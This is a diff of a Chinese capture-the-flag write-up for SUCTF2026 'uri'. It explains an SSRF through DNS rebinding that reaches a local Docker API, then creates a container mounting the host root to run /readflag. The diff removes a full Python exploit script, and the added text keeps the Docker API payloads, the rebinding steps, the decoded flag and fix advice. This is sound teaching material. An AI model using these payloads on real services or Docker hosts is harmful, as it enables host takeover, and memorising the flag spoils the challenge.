@@ -1,302 +1,204 @@
 # SUCTF2026-uri
 
 ## 题目简述
-题目描述是 `Meng spotted a simple webhook. Are there any attack vectors here?`，没有附件，只有靶机。实际页面是 webhook 调试面板导致的 SSRF：后端对 URL 做解析后检查本地/私网 IP，但真正发起请求时没有固定检查得到的解析结果，因此可用 DNS rebinding 让检查阶段和连接阶段解析到不同地址，进一步访问内网 Docker API。
+
+题目是一个 webhook 转发服务。用户向 `/api/webhook` 提交目标 URL 和请求体，服务端校验 URL 后等待两秒，再向目标发送 POST，并把目标状态码和最多 64 KiB 响应体返回。校验会解析域名并拒绝 localhost、本地地址和常见私网网段，但没有把校验得到的 IP 固定给真正的 HTTP 连接，因此可用 DNS Rebinding 让两次解析分别得到公网 IP 与 `127.0.0.1`。
+
+容器启动时，root 进程用 `socat` 把 `127.0.0.1:2375` 转发到挂载的 `/var/run/docker.sock`，随后才降权运行 Web 服务。通过 SSRF 访问这个本机端口，就能调用宿主 Docker API，创建一个挂载宿主根目录的容器并执行宿主上的 `/readflag`。
+
+官方 WP 与总 WP 的主链相同，只在 Docker API 的取回方式上不同：官方让新容器直接运行读取命令，再用 attach 接口取日志；总 WP 创建常驻容器后使用 exec API 同步取回输出。下面先写官方流程，再给出更易处理返回值的 exec 变体。
 
 ## 解题过程
-访问首页后可以看到这是一个简单的 webhook 调试面板，前端会把我们填写的目标地址和请求体提交
-到后端接口：
+
+### 1. 确认 webhook SSRF 能力
+
+前端最终发送：
 
 ```javascript
-const resp = await fetch('/api/webhook', {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({ url, body })
+fetch('/api/webhook', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url, body})
 });
 ```
 
-这说明真正的核心点在 /api/webhook 。直接向接口打SSRF
+最小测试请求为：
 
-```
+```json
 {
-"url": "http://example.com",
-"body": "{\"event\":\"ping\"}"
+  "url": "http://public.example/",
+  "body": "{\"event\":\"ping\"}"
 }
 ```
 
-后端会代替我们向目标地址发送 POST 请求，并把返回结果带回：
+服务端固定对目标发送 `POST`，并设置 `Content-Type: application/json`。成功转发时，外层响应形如：
 
-```
+```json
 {
-"message": "forwarded",
-"target_status": 405,
-"target_body": "..."
+  "message": "forwarded",
+  "target_status": 200,
+  "target_body": "..."
 }
 ```
 
-继续测试发现后端确实拦截了明显的本地和私网地址：
+需要区分挑战服务自身的 HTTP 状态与 `target_status`：前者通常是 `200`，后者才是 Docker API 返回的 `201`、`204` 或 `200`。
 
+### 2. 定位 DNS Rebinding 条件
+
+`waf.ValidateURL` 的检查顺序是：
+
+1. 只允许 `http`、`https`；
+2. 拒绝空 host 与字面 `localhost`；
+3. 调用 `net.LookupIP(host)`；
+4. 遍历解析到的全部 IP，拒绝 loopback、未指定地址、链路本地地址、IPv4 私网、CGNAT 与 IPv6 ULA；
+5. 将 `::ffff:127.0.0.1` 这类 IPv4-mapped IPv6 地址先 `Unmap`，再执行同一检查。
+
+所以十六进制 IP、IPv4-mapped IPv6 或让一个 DNS 响应同时含公网和私网地址都不能绕过。漏洞位于校验之后：
+
+```go
+if err := waf.ValidateURL(req.URL); err != nil {
+    // reject
+}
+time.Sleep(2 * time.Second)
+status, body, err := client.Post(req.URL, req.Body)
 ```
-http://127.0.0.1:10011/ -> blocked IP: 127.0.0.1
-http://localhost:10011/ -> blocked host: localhost
-http://10.0.0.1/ -> blocked IP: 10.0.0.1
-http://172.17.0.1/ -> blocked IP: 172.17.0.1
+
+`ValidateURL` 的解析结果没有传给 `http.Client`；`client.Post` 会重新根据域名建立连接。可控 DNS 记录应让校验阶段先返回可接受的公网地址，在 TTL 到期或下一次查询时返回 `127.0.0.1`。
+
+每次尝试使用新的随机子域，既避免上游缓存复用旧答案，也便于为每一步维护独立的解析状态：
+
+```text
+<随机标签>.rebind.example
+  第一次查询 -> 公网 IP
+  第二次查询 -> 127.0.0.1
 ```
 
-但这个校验并不安全，因为它只是“解析后检查”，并没有把检查得到的 IP 固定下来用于真正的连
-接。这类场景最经典的绕过就是 DNS rebinding 。这里可以使用 1u.ms 提供的 rebinding 域
-名，例如：<random>.make-35.180.139.74-rebind-127.0.0.1-rr.1u.ms
+应用故意加入的两秒延迟给短 TTL 记录留出了切换窗口。实际解析器仍可能缓存或改变查询次数，所以每个 Docker API 步骤都应允许多次重试，并验证 `target_status` 与 `target_body`，不能只看外层请求成功。
 
-通过 rebinding 对 127.0.0.1 常见端口做探测，发现：
+### 3. 识别本机 Docker API
 
-有 HTTP 服务• 127.0.0.1:8080
+用 rebinding 域名把目标端口改为 `2375`，向一个无副作用或参数不完整的 Docker POST 接口发请求。例如：
 
-存在 Docker Remote API• 127.0.0.1:2375
-
-例如对 Docker 的典型接口发送请求：
-
+```text
+POST http://<随机重绑定域名>:2375/v1.41/containers/create
+body: {}
 ```
-POST /v1.41/containers/create
-返回：
+
+若 `target_body` 返回类似：
+
+```json
 {"message":"config cannot be empty in order to create a container"}
 ```
 
-这已经足以证明本地 2375 就是 Docker API。
+即可确认服务类型。源码进一步解释了端口来源：`docker-compose.yml` 把宿主 `/var/run/docker.sock` 挂入 CloudHook 容器，`entrypoint.sh` 以 root 启动：
 
-打到这里就很明确了：创建一个新容器->把宿主机根目录挂载到容器内->在容器里执行宿主机上的
-
-$$
-/readflag
-$$
-
-```python
-#!/usr/bin/env python3
-import argparse
-import json
-import random
-import re
-import socket
-import string
-import sys
-import time
-import urllib.error
-import urllib.request
-
-DEFAULT_BASE = "http://<target>:10011"
-PRIVATE_IP = "127.0.0.1"
-
-def rand_label(n=6):
-return "".join(random.choice(string.hexdigits.lower()[:16]) for _ in
-range(n))
-
-def resolve_portquiz_ip():
-return socket.gethostbyname("portquiz.net")
-
-def build_rebind_host(public_ip, private_ip):
-return f"{rand_label()}.make-{public_ip}-rebind-{private_ip}-rr.1u.ms"
-
-def http_post_json(url, obj, timeout=20):
-data = json.dumps(obj).encode()
-req = urllib.request.Request(
-url,
-data=data,
-headers={"Content-Type": "application/json"},
-method="POST",
-)
-try:
-with urllib.request.urlopen(req, timeout=timeout) as resp:
-return json.loads(resp.read().decode())
-except urllib.error.HTTPError as exc:
-body = exc.read().decode(errors="replace")
-try:
-return json.loads(body)
-except json.JSONDecodeError:
-raise RuntimeError(f"HTTP {exc.code}: {body}") from exc
-
-def forward_once(base_url, target_url, body):
-webhook = base_url.rstrip("/") + "/api/webhook"
-return http_post_json(webhook, {"url": target_url, "body": body},
-timeout=30)
-
-def looks_like_public_fallback(target_body):
-if not target_body:
-return False
-public_markers = (
-"Outgoing Port Tester",
-"Apache/2.4.29 (Ubuntu) Server",
-"Portquiz",
-"portquiz.net",
-)
-return any(marker in target_body for marker in public_markers)
-
-def try_docker_post(
-base_url,
-
-public_ip,
-path,
-body,
-expected_status,
-max_tries=30,
-delay=0.2,
-verbose=False,
-validator=None,
-):
-last = None
-for attempt in range(1, max_tries + 1):
-host = build_rebind_host(public_ip, PRIVATE_IP)
-target = f"http://{host}:2375{path}"
-try:
-resp = forward_once(base_url, target, body)
-except Exception as exc: # noqa: BLE001
-last = str(exc)
-if verbose:
-print(f"[try {attempt:02d}] request error: {exc}")
-time.sleep(delay)
-continue
-
-last = resp
-message = resp.get("message")
-status = resp.get("target_status")
-target_body = resp.get("target_body", "")
-
-if verbose:
-snippet = repr(target_body[:100])
-print(f"[try {attempt:02d}] status={status} message={message} body=
-{snippet}")
-
-if message != "forwarded":
-time.sleep(delay)
-continue
-if status != expected_status:
-time.sleep(delay)
-continue
-if looks_like_public_fallback(target_body):
-time.sleep(delay)
-continue
-if validator is not None and not validator(target_body):
-time.sleep(delay)
-continue
-return resp
-
-raise RuntimeError(f"exhausted retries for {path}, last response: {last}")
-
-def parse_json_with_id(text):
-try:
-obj = json.loads(text)
-except json.JSONDecodeError:
-return None
-return obj.get("Id")
-
-def extract_flag(text):
-match = re.search(r"SUCTF\{[^}]+\}", text)
-return match.group(0) if match else None
-
-def main():
-parser = argparse.ArgumentParser(description="Exploit CloudHook SSRF + DNS
-rebinding + Docker API")
-parser.add_argument("--base-url", default=DEFAULT_BASE, help="Challenge
-base URL")
-parser.add_argument("--public-ip", help="Public IP used for the first DNS
-answer. Default: resolve portquiz.net")
-parser.add_argument("--tries", type=int, default=30, help="Max retries per
-Docker API step")
-parser.add_argument("--verbose", action="store_true", help="Print every
-rebinding attempt")
-args = parser.parse_args()
-
-public_ip = args.public_ip or resolve_portquiz_ip()
-container_name = "pwn" + rand_label(8)
-
-print(f"[+] challenge : {args.base_url}")
-print(f"[+] public ip : {public_ip}")
-print(f"[+] private ip : {PRIVATE_IP}")
-print(f"[+] container : {container_name}")
-
-create_body = json.dumps(
-{
-"Image": "alpine",
-"Cmd": ["sh", "-c", "sleep 3600"],
-"HostConfig": {"Binds": ["/:/host:ro"]},
-},
-separators=(",", ":"),
-)
-
-print("[+] create container")
-create_resp = try_docker_post(
-args.base_url,
-public_ip,
-f"/v1.41/containers/create?name={container_name}",
-
-create_body,
-expected_status=201,
-max_tries=args.tries,
-verbose=args.verbose,
-validator=lambda body: parse_json_with_id(body) is not None,
-)
-container_id = parse_json_with_id(create_resp["target_body"])
-print(f"[+] container id : {container_id}")
-
-print("[+] start container")
-try_docker_post(
-args.base_url,
-public_ip,
-f"/v1.41/containers/{container_name}/start",
-"{}",
-expected_status=204,
-max_tries=args.tries,
-verbose=args.verbose,
-)
-
-print("[+] create exec")
-exec_body = json.dumps(
-{
-"AttachStdout": True,
-"AttachStderr": True,
-"Cmd": ["sh", "-c", "/host/readflag"],
-},
-separators=(",", ":"),
-)
-exec_resp = try_docker_post(
-args.base_url,
-public_ip,
-f"/v1.41/containers/{container_name}/exec",
-exec_body,
-expected_status=201,
-max_tries=args.tries,
-verbose=args.verbose,
-validator=lambda body: parse_json_with_id(body) is not None,
-)
-exec_id = parse_json_with_id(exec_resp["target_body"])
-print(f"[+] exec id : {exec_id}")
-
-print("[+] start exec")
-exec_start = try_docker_post(
-args.base_url,
-public_ip,
-f"/v1.41/exec/{exec_id}/start",
-
-'{"Detach":false,"Tty":false}',
-expected_status=200,
-max_tries=args.tries,
-verbose=args.verbose,
-)
-
-raw = exec_start.get("target_body", "")
-flag = extract_flag(raw)
-print("[+] raw response:")
-print(raw)
-
-if not flag:
-print("[-] flag not found in raw output", file=sys.stderr)
-sys.exit(1)
-
-print(f"[+] FLAG: {flag}")
-
-if __name__ == "__main__":
-main()
+```bash
+socat TCP-LISTEN:2375,bind=127.0.0.1,reuseaddr,fork \
+      UNIX-CONNECT:/var/run/docker.sock &
 ```
 
+之后才用 `su-exec` 将 Go Web 服务降权到 `ctfer`。因此 SSRF 访问的是容器本机 TCP 转发器，但其权限实际等价于控制宿主 Docker daemon。
+
+### 4. 官方路线：创建容器并从日志取回 flag
+
+如果 daemon 中没有 `alpine:latest`，官方脚本先经 webhook 请求：
+
+```text
+POST /images/create?fromImage=alpine:latest
+```
+
+这一阶段需要 daemon 能访问镜像源；若环境已缓存镜像则可省略。随后创建容器，并把宿主根目录挂到 `/mnt`：
+
+```json
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "/mnt/readflag"],
+  "HostConfig": {
+    "Binds": ["/:/mnt:ro"]
+  }
+}
+```
+
+对应请求为：
+
+```text
+POST /containers/create?name=<随机名>
+```
+
+从 `target_body` 二次解析 JSON，取得 `Id`。再依次经新的 rebinding 子域发送：
+
+```text
+POST /containers/<id>/start
+POST /containers/<id>/attach?logs=1&stream=0&stdout=1&stderr=1
+```
+
+第一步预期目标状态为 `204`，第二步返回容器 stdout/stderr。Docker attach 可能使用带帧头的 raw-stream 格式，因此取回字符串时应在整个字节流中按 `SUCTF{...}` 搜索，而不是假设响应体只有纯 flag。
+
+官方旧脚本还执行了 `ln -s /mnt/flag /flag`；当前仓库的 `readflag.c` 直接解码内置字节并输出，不再读取该符号链接。以当前源码复现时，直接运行 `/mnt/readflag` 即可，避免把旧环境细节误当成必要条件。
+
+### 5. 替代路线：Docker exec 同步取回输出
+
+总 WP 采用四步 exec 流程，通常比 attach 更容易在 webhook 的字符串响应中处理：
+
+1. 创建一个执行 `sleep 3600` 的 Alpine 容器，并绑定 `/:/host:ro`；
+2. 启动容器；
+3. 调用 `/containers/<id>/exec` 创建执行实例；
+4. 调用 `/exec/<exec-id>/start`，设置 `Detach=false`，同步取得输出。
+
+创建容器的主体为：
+
+```json
+{
+  "Image": "alpine",
+  "Cmd": ["sh", "-c", "sleep 3600"],
+  "HostConfig": {
+    "Binds": ["/:/host:ro"]
+  }
+}
+```
+
+创建 exec：
+
+```json
+{
+  "AttachStdout": true,
+  "AttachStderr": true,
+  "Cmd": ["sh", "-c", "/host/readflag"]
+}
+```
+
+最后启动：
+
+```json
+{
+  "Detach": false,
+  "Tty": false
+}
+```
+
+每一步都要换新的随机重绑定域名，并检查预期结果：
+
+```text
+create      -> target_status 201，target_body 含 Id
+start       -> target_status 204
+exec create -> target_status 201，target_body 含 Id
+exec start  -> target_status 200，target_body 含 flag
+```
+
+官方 attach 路线和这条 exec 路线只是在输出收集方式上不同；二者的安全边界突破都发生在 `HostConfig.Binds`。一旦能控制 Docker daemon，Web 容器中的低权限身份不再构成隔离。
+
+### 6. 校验 flag 来源
+
+`setup/readflag.c` 用固定 `0x55` 对数组逐字节异或，再写到 stdout。按源码解码可得到：
+
+```text
+SUCTF{SsRF_tO_rC3_by_d0CkEr_15_s0_FUn}
+```
+
+仓库 README 也标明当前为静态 flag；若比赛平台后续接入动态注入，应以实际 `/readflag` 输出为准。
+
 ## 方法总结
-- 核心技巧：SSRF + DNS rebinding + Docker API
-- 识别信号：后端代发请求，拦截 localhost/私网但不绑定解析结果。
-- 复用要点：用 rebinding 域名绕过 IP 检查，探测内网端口，命中 Docker Remote API 后创建容器读取敏感文件。
+
+本题不是因为私网网段黑名单漏写了某一种 IP 表示法。源码已经覆盖 localhost、常见 IPv4/IPv6 私网与 IPv4-mapped IPv6；决定性问题是 TOCTOU：安全检查解析了一次域名，真实连接又独立解析一次，且中间刻意等待两秒。修复应让连接阶段使用已验证的地址，并同时验证 Host/SNI，而不是继续扩充字符串黑名单。
+
+SSRF 命中 `127.0.0.1:2375` 后，风险来自 Docker socket 的等价 root 权限。创建容器、绑定宿主根目录、执行宿主 `/readflag` 是一条直接的控制面利用链。实践中最容易失败的是 DNS 缓存与 Docker API 返回值判断，因此每一步都应使用唯一域名、重试，并验证内层 `target_status` 和二次 JSON 响应。
